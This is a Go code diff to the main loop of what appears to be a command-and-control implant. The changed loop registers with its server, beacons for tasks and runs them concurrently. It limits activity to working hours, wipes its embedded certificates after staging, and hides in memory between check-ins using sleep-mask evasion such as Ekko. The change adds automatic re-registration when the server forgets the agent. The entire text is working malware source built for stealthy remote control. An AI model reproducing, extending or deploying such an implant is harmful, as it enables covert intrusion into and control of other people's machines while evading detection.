@@ -141,61 +141,72 @@ func Run(t transport) {
 
 	info := getSysInfo()
 
+outer:
 	for {
-		if err := t.register(info); err != nil {
-			state.fail()
-			time.Sleep(state.next())
-			continue
-		}
-		// Expose our agent ID so pivots can set parent_id for child agents
-		if id, ok := t.(interface{ agentIDStr() string }); ok {
-			GlobalAgentID = id.agentIDStr()
-		}
-		state.ok()
-		if StageCleanup == "true" {
-			AgentCertPEM = ""
-			AgentKeyPEM  = ""
-			CACertPEM    = ""
-		}
-		break
-	}
-
-	for {
-		if !inWorkingHours() {
-			sleepUntilWorkHours()
-			continue
-		}
-
-		tasks, err := t.beacon()
-		if err != nil {
-			state.fail()
-			if MaxRetry != "0" {
-				if n, _ := strconv.Atoi(MaxRetry); n > 0 && state.fails() >= n {
-					os.Exit(0)
-				}
+		// ── registration loop ──────────────────────────────────────────────
+		for {
+			if err := t.register(info); err != nil {
+				state.fail()
+				time.Sleep(state.next())
+				continue
 			}
-		} else {
+			// Expose our agent ID so pivots can set parent_id for child agents
+			if id, ok := t.(interface{ agentIDStr() string }); ok {
+				GlobalAgentID = id.agentIDStr()
+			}
 			state.ok()
-			var wg sync.WaitGroup
-			for _, task := range tasks {
-				wg.Add(1)
-				go func(task taskWire) {
-					defer wg.Done()
-					dispatchTask(t, task)
-				}(task)
+			if StageCleanup == "true" {
+				AgentCertPEM = ""
+				AgentKeyPEM  = ""
+				CACertPEM    = ""
 			}
-			wg.Wait() // must complete before sleep mask scrambles the AES key
+			break
 		}
-		d := state.next()
-		switch SleepMaskMode {
-		case "none", "off", "plain":
-			time.Sleep(d)
-		case "noaccess":
-			sleepMaskNoAccess(uint32(d.Milliseconds()))
-		case "ekko":
-			sleepMaskEkko(uint32(d.Milliseconds()))
-		default:
-			sleepMask(uint32(d.Milliseconds()))
+
+		// ── beacon loop ────────────────────────────────────────────────────
+		for {
+			if !inWorkingHours() {
+				sleepUntilWorkHours()
+				continue
+			}
+
+			tasks, err := t.beacon()
+			if err != nil {
+				state.fail()
+				if err == errAgentUnknown {
+					// Server no longer recognises our agentID (deleted from GUI
+					// or server wiped). Re-register immediately instead of backing
+					// off forever with a stale agentID.
+					continue outer
+				}
+				if MaxRetry != "0" {
+					if n, _ := strconv.Atoi(MaxRetry); n > 0 && state.fails() >= n {
+						os.Exit(0)
+					}
+				}
+			} else {
+				state.ok()
+				var wg sync.WaitGroup
+				for _, task := range tasks {
+					wg.Add(1)
+					go func(task taskWire) {
+						defer wg.Done()
+						dispatchTask(t, task)
+					}(task)
+				}
+				wg.Wait() // must complete before sleep mask scrambles the AES key
+			}
+			d := state.next()
+			switch SleepMaskMode {
+			case "none", "off", "plain":
+				time.Sleep(d)
+			case "noaccess":
+				sleepMaskNoAccess(uint32(d.Milliseconds()))
+			case "ekko":
+				sleepMaskEkko(uint32(d.Milliseconds()))
+			default:
+				sleepMask(uint32(d.Milliseconds()))
+			}
 		}
 	}
 }
